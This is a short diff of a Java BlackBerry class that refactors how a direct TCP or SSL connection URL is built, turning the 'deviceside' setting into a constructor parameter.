@@ -17,31 +17,38 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class DirectTcpConnection extends Connection {
-	//#debug
+    //#debug
     static Debug debug = new Debug("DirectTcp", DebugLevel.VERBOSE);
 
     private String host;
     private int port;
     private boolean ssl;
 
-    boolean isDirectTCP = true;
     int timeout = 3 * 60 * 1000;
 
+    boolean deviceside;
+
     // Constructor
-    public DirectTcpConnection(String host_, int port_, boolean ssl_) {
+    public DirectTcpConnection(String host_, int port_, boolean ssl_,
+            boolean deviceside_) {
         this.host = host_;
         this.port = port_;
         this.ssl = ssl_;
-        
+        this.deviceside = deviceside_;
+
         if (ssl) {
-            url = "ssl://" + host + ":" + port
-                    + (isDirectTCP ? ";deviceside=true" : "")
-                    + ";ConnectionTimeout=" + timeout;
+            url = "ssl://" + host + ":" + port + ";ConnectionTimeout="
+                    + timeout;
 
         } else {
-            url = "socket://" + host + ":" + port
-                    + (isDirectTCP ? ";deviceside=true" : "")
-                    + ";ConnectionTimeout=" + timeout;
+            url = "socket://" + host + ":" + port + ";ConnectionTimeout="
+                    + timeout;
+        }
+
+        if (deviceside) {
+            url += ";deviceside=true";
+        } else {
+            url += ";deviceside=false";
         }
     }
 
